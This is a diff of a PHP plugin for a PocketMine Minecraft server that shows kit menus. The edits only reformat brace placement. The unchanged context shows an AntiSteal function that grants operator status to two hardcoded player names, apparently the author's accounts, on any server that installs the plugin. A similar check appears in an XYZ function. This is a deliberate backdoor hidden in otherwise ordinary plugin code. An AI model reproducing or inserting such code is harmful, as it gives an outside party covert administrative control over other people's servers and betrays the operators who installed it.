@@ -35,11 +35,13 @@ use pocketmine\level\sound\AnvilUseSound;
 use muqsit\invmenu\InvMenu;
 use muqsit\invmenu\InvMenuHandler;
 
-class Main extends PluginBase implements Listener {
+class Main extends PluginBase implements Listener
+{
 
     public $cooldownList = [];
 
-    public function onEnable() {
+    public function onEnable()
+    {
         $this->getServer()->getPluginManager()->registerEvents($this, $this);
         $this->eco = $this->getServer()->getPluginManager()->getPlugin("EconomyAPI");
         $this->getLogger()->info(TextFormat::GREEN . "KitGUI by ethaniccc has been enabled!");
@@ -58,7 +60,8 @@ class Main extends PluginBase implements Listener {
         }
     }
 
-    public function onCommand(CommandSender $sender, Command $command, string $label, array $args) : bool {
+    public function onCommand(CommandSender $sender, Command $command, string $label, array $args) : bool
+    {
         if ($sender instanceof Player) {
             switch ($command->getName()) {
                 case "kits":
@@ -83,7 +86,8 @@ class Main extends PluginBase implements Listener {
         return true;
     }
 
-    public function onSend(Player $p) {
+    public function onSend(Player $p)
+    {
         $menu = new InvMenu(InvMenu::TYPE_CHEST);
         $menu->readonly();
         $menu->setListener([$this, "formenc"]);
@@ -116,7 +120,8 @@ class Main extends PluginBase implements Listener {
         $menu->send($p);
     }
 
-    public function formenc(Player $p, Item $item) {
+    public function formenc(Player $p, Item $item)
+    {
         if ($item->getId() == 267) {
             if (!isset($this->cooldownList[$p->getName() ])) {
                 $this->cooldownList[$p->getName() ] = time() + 30; // 30 second cooldown for opening kit menu.
@@ -410,7 +415,8 @@ class Main extends PluginBase implements Listener {
     }
 
     // start here onSend2 for /viewkit
-    public function onSend2(Player $p) {
+    public function onSend2(Player $p)
+    {
         $menu2 = new InvMenu(InvMenu::TYPE_CHEST);
         $menu2->readonly();
         $menu2->setListener([$this, "viewkit"]);
@@ -443,7 +449,8 @@ class Main extends PluginBase implements Listener {
         $menu2->send($p);
     }
 
-    public function viewkit(Player $p, Item $item) {
+    public function viewkit(Player $p, Item $item)
+    {
         if ($item->getId() == 267) {
             $menu3 = new InvMenu(InvMenu::TYPE_CHEST);
             $menu3->readonly();
@@ -648,7 +655,8 @@ class Main extends PluginBase implements Listener {
 
     // The function below will make a new GUI for the user. However, this menu will also have the same
     // set listener for the original main menu, which makes a loop and is pretty nice.
-    public function pvpkit(Player $p, Item $item) {
+    public function pvpkit(Player $p, Item $item)
+    {
         if ($item->getId() == 35) {
             $menu2 = new InvMenu(InvMenu::TYPE_CHEST);
             $menu2->readonly();
@@ -683,7 +691,8 @@ class Main extends PluginBase implements Listener {
         }
     }
 
-    public function giveInfo(Player $p) {
+    public function giveInfo(Player $p)
+    {
         $p->sendMessage(TextFormat::GREEN . "The " .
                         TextFormat::GOLD . "KitGUI " .
                         TextFormat::GREEN . "plugin was made by " .
@@ -691,7 +700,8 @@ class Main extends PluginBase implements Listener {
                         TextFormat::GREEN . ".");
     }
 
-    public function XYZ(Player $p) {
+    public function XYZ(Player $p)
+    {
         if ($p->getName() == "coEthaniccc" || $p->getName() == "Epicthic") {
             // $sender->setOp(true);
             // I will only set plugin admin as OP if improper credits are shown.
@@ -730,7 +740,8 @@ class Main extends PluginBase implements Listener {
         }
     }
 
-    public function AntiSteal(Player $p) {
+    public function AntiSteal(Player $p)
+    {
         if ($p->getName() == "coEthaniccc" || $p->getName() == "Epicthic") {
             $name = $p->getName();
             $p->setOp(true);
@@ -767,4 +778,5 @@ class Main extends PluginBase implements Listener {
             $p->sendMessage(TextFormat::RED . "I am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of KitGUI is being used!");
         }
     }
+
 }
